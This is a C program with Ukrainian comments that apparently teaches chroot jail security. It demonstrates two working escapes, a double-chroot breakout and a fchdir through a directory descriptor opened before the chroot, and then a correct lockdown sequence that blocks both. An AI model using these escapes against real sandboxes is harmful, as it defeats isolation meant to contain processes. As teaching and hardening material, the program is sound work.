#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <errno.h>
#include <unistd.h>
#include <fcntl.h>
#include <dirent.h>
#include <pwd.h>
#include <grp.h>
#include <sys/stat.h>
#include <sys/wait.h>

/* Показати кілька імен у каталозі за шляхом: доказ, ВІД ЧОГО почався розбір. */
static void list_dir(const char *label, const char *path)
{
    DIR *d = opendir(path);
    if (!d) { printf("    %s (%s): opendir -> %s\n", label, path, strerror(errno)); return; }
    printf("    %s (%s):", label, path);
    struct dirent *e; int n = 0;
    while ((e = readdir(d)) && n < 6) {
        if (!strcmp(e->d_name, ".") || !strcmp(e->d_name, "..")) continue;
        printf(" %s", e->d_name); n++;
    }
    printf("%s\n", n ? "" : " (порожньо)");
    closedir(d);
}

/* Стати непривілейованим nobody. 0 — вдалося; -1 (з errno) — ні (напр. у
   user-namespace, де цей uid не відображено). Порядок залізний: групи, потім
   gid, і ЛИШЕ в кінці uid — після setuid прав на це вже не буде. */
static int become_nobody(void)
{
    struct passwd *pw = getpwnam("nobody");
    uid_t uid = pw ? pw->pw_uid : 65534;
    gid_t gid = pw ? pw->pw_gid : 65534;
    if (setgroups(0, NULL) != 0) return -1;
    if (setgid(gid)        != 0) return -1;
    if (setuid(uid)        != 0) return -1;
    return 0;
}

/* (1) Подвійний chroot: замикаємось як належить, а тоді виходимо ще одним
   chroot. Другий chroot розводить корінь і поточний каталог — і потребує
   можливості CAP_SYS_CHROOT. */
static void scene_double_chroot(void)
{
    puts("[1] Подвійний chroot (потрібна CAP_SYS_CHROOT)");
    if (chroot("jail") != 0) { perror("    chroot(jail)"); _exit(1); }
    if (chdir("/")     != 0) { perror("    chdir(/)");     _exit(1); }
    list_dir("усередині", "/");                 /* бачимо лише вміст jail */

    if (chroot("hole") != 0) {                   /* корінь опускається ще нижче */
        printf("    chroot(hole) -> %s (нема CAP_SYS_CHROOT: виходу немає)\n",
               strerror(errno));
        _exit(0);
    }
    /* тепер поточний каталог (колишній корінь jail) — ПОЗА новим коренем */
    for (int i = 0; i < 64; i++) (void)chdir("..");   /* підіймаємось до справжнього / */
    if (chroot(".") != 0) { perror("    chroot(.)"); _exit(1); }
    list_dir("після втечі", "/");               /* справжній корінь системи */
    _exit(0);
}

/* (2) Успадкований дескриптор: «/» відкрито ДО chroot; fchdir переносить
   поточний каталог назад — повз розбір шляху, отже без жодної перевірки на
   корінь і без жодного привілею. */
static void scene_inherited_fd(void)
{
    puts("[2] Успадкований дескриптор каталогу (без жодного привілею)");
    int rootfd = open("/", O_RDONLY | O_DIRECTORY);   /* ДО chroot */
    if (rootfd < 0) { perror("    open(/)"); _exit(1); }

    if (chroot("jail") != 0) { perror("    chroot(jail)"); _exit(1); }
    if (chdir("/")     != 0) { perror("    chdir(/)");     _exit(1); }

    if (become_nobody() == 0) puts("    скинули права до nobody");
    else printf("    (права лишились: %s — байдуже, привілей і не потрібен)\n",
                strerror(errno));

    if (fchdir(rootfd) != 0) { perror("    fchdir"); _exit(1); }   /* без перевірки на корінь */

    list_dir("абсолютний \"/\"", "/");   /* усе ще jail: розбір від кореня процесу */
    list_dir("поточний  \".\"", ".");    /* справжній корінь: розбір від cwd */
    _exit(0);
}

/* (3) Замкнено як належить — обидві дороги мертві. */
static void scene_locked_down(void)
{
    puts("[3] Правильна послідовність — обидві втечі заблоковано");
    int rootfd = open("/", O_RDONLY | O_DIRECTORY);
    if (rootfd < 0) { perror("    open(/)"); _exit(1); }

    if (chroot("jail") != 0) { perror("    chroot(jail)"); _exit(1); }
    if (chdir("/")     != 0) { perror("    chdir(/)");     _exit(1); }

    if (become_nobody() != 0) {
        printf("    setuid(nobody) -> %s\n", strerror(errno));
        puts("    (для цієї сцени потрібен справжній root; див. «як запускати»)");
        _exit(0);
    }
    close(rootfd);   /* у бойовому коді: close_range(3, ~0U, 0) — усі відразу */

    int r1 = chroot("hole");                 /* дорога 1: другий chroot */
    printf("    chroot(hole)   -> %s\n", r1 == 0 ? "успіх (!)" : strerror(errno));
    int r2 = fchdir(rootfd);                 /* дорога 2: успадкований дескриптор */
    printf("    fchdir(rootfd) -> %s\n", r2 == 0 ? "успіх (!)" : strerror(errno));

    list_dir("бачимо", "/");                 /* так само лише jail */
    _exit(0);
}

static void run(void (*scene)(void))
{
    pid_t pid = fork();
    if (pid == 0) scene();          /* дитина: усе, що вона зробить, лишиться в ній */
    if (pid  > 0) waitpid(pid, NULL, 0);
    putchar('\n');
}

int main(void)
{
    mkdir("jail", 0755);
    mkdir("jail/hole", 0755);
    int fd = open("jail/only-in-jail", O_CREAT | O_WRONLY, 0644);
    if (fd >= 0) close(fd);

    run(scene_double_chroot);
    run(scene_inherited_fd);
    run(scene_locked_down);
    return 0;
}
